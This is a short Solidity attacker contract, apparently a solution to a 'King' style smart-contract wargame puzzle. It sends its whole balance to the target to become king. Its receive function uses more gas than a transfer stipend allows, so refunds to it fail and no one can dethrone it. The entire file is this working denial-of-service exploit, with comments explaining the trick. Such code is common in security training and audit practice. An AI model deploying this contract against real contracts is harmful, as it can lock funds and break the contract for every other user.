pragma solidity ^0.8.0;

contract KingAttacker {

    uint256 state; // save gas by not setting

    // @dev called on transfer - wastes gas
    receive() external payable {
        state = 1;
    }

    // @dev takes funds necessary to become king
    function provideFunds() external payable {
    }

    // @dev interact with the king contract
    function becomeKing(address king) external {
        (bool success,) = king.call{value:address(this).balance}(""); // hits fallback
        require(success);
    }
}
